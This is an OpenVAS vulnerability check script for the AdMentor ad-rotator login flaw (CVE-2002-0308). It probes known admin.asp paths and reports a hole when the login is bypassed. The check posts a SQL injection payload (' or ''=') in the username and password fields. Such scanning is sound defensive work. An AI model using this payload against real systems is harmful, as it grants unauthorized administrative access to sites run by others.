# OpenVAS Vulnerability Test
# $Id: admentor_login_flaw.nasl 17 2013-10-27 14:01:43Z jan $
# Description: AdMentor Login Flaw
#
# Authors:
# SecurITeam
#
# Copyright:
# Copyright (C) 2002 SecurITeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "AdMentor is a totally free ad rotator script written entirely in ASP. 
A security vulnerability in the product allows remote attackers to
cause the login administration ASP to allow them to enter without
knowing any username or password (thus bypassing any authentication
protection enabled for the ASP file).";

tag_solution = "Contact the author for a patch
";
if(description)
{
 script_id(10880);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(4152);
 script_cve_id("CVE-2002-0308");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");
 name = "AdMentor Login Flaw";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 
 summary = "AdMentor Login Flaw";
 
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2002 SecurITeam");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securiteam.com/windowsntfocus/5DP0N1F6AW.html");
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

function check(req)
{
  host = get_host_name();
  if ( ! is_cgi_installed_ka(item:req, port:port) ) return NULL;

  variables = string("userid=%27+or+%27%27%3D%27&pwd=%27+or+%27%27%3D%27&B1=Submit");
  req = string("POST ", req, " HTTP/1.1\r\n", "Host: ", host, ":", port, "\r\n", "Content-Type: application/x-www-form-urlencoded\r\n", "Content-Length: ", strlen(variables), "\r\n\r\n", variables);

  buf = http_keepalive_send_recv(port:port, data:req);
  if(buf == NULL)exit(0);

  if (("Welcome" >< buf) && ("Admin interface" >< buf) && ("AdMentor Menu" >< buf))
  {
   	security_hole(port:port);
	exit(0);
  }
 
 
 return(0);
}

port = get_http_port(default:80);
if ( ! can_host_asp(port:port) ) exit(0);


url = string("/admentor/admin/admin.asp?login=yes");
check(req:url);

url = string("/ads/admentor/admin/admin.asp?login=yes");
check(req:url);

foreach dir (cgi_dirs())
{
url = string(dir, "/admentor/admin/admin.asp?login=yes");
check(req:url);
}
